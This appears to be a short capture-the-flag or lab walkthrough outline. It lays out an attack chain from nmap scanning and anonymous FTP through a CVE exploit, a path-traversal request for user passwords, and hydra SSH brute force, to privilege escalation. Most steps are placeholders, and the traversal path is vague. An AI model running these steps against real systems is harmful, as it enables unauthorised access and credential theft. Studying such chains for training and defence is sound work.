# FTP => Path Traversal => CVE

1. Initial Recon | Techniques: Nmap Scan
```bash
nmap -sC -sV -sS <Target IP>
```

2. FTP Enumeration | Techniques: Anonymous FTP Access
```bash
ftp <Target IP>
# then use ls, cd, get commands to interact 
```

3. File Analysis | Techniques: Reviewing Downloaded Files
```bash
get "DownloadFile"
```

4. Web Enumeration | Techniques: Enumerate Web Pages
```bash
Manual inspection of web application on port 80/tcp
```

5. Exploitation | Techniques: Exploit Vulnerability (such as CVE-2019-2085)
```bash
# Use CVE details from Exploit-DB and Burp Suite to exploit
```

6. Credential Access | Techniques: Extarct Password via Directory Traversal
```bash
GET /../../../../windows/user/ #hijack users password
```

7. Brute Force | Techniques: SSH Brute Force with Hydra
```bash
hydra -L users.txt -P pass.txt <TargetIP> ssh
```

8. SSH Access | Techniques: Login via SSH
```bash
#SSH login with found credentials
```

9. Privilege Escalation | Techniques: Exploit Vulnerability
```bash
#Follow CVE detailss from Exploit-DB to exploit vulnerability
```

10. Local Port Forwarding | Techniques: Port Forwarding via SSH
```bash
#Use SSH port forwarding to interact with local services
```



